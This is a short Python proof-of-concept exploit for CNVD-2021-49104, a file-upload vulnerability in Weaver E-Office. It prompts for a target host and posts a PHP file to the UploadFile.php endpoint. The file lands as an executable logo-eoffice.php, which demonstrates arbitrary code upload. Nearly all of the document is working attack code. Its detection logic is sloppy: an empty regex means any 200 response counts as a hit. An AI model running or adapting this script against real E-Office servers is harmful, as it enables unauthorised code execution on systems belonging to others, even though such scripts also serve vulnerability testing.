# Date:2021/11/29
# Author:by novy

import requests
import re
import sys
import io

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

author = '''
---------------------------------------
CNVD-2021-49104 泛微E-Office文件上传漏洞
by novy
---------------------------------------\n'''
print(author)
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
'Accept-Encoding':'gzip, deflate',
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Language':'zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6',
'Cookie':'LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348',
'Content-Type':'multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4'
}
domain = input('请输入域名或ip(e,g:www.xx.com/xxx.xxx.xx):')
url = 'http://%s/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=' % (domain)
data = """
--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="test.php"
Content-Type: image/jpeg

<?php echo "Hello";?>
--e64bdf16c554bbc109cecef6451c26a4--"""
proxies = {"http": "http://127.0.0.1:8080", "https:": "https://127.0.0.1:8080"}
rep = requests.post(url, data=data, headers=headers, proxies=proxies)
html = rep.content
html1=html.decode('utf-8')
if re.findall(r'logo_eoffice', html1):
	print("\n[+]漏洞存在，验证地址：\nhttp://localhost/images/logo/logo-eoffice.php")
if rep.status_code == 200:
    if re.findall(r'', html1):
        print("\n[+]漏洞疑似存在，请验证：\nhttp://localhost/images/logo/logo-eoffice.php")
if rep.status_code != 200:
	print("[!]异常，状态码：",rep.status_code)
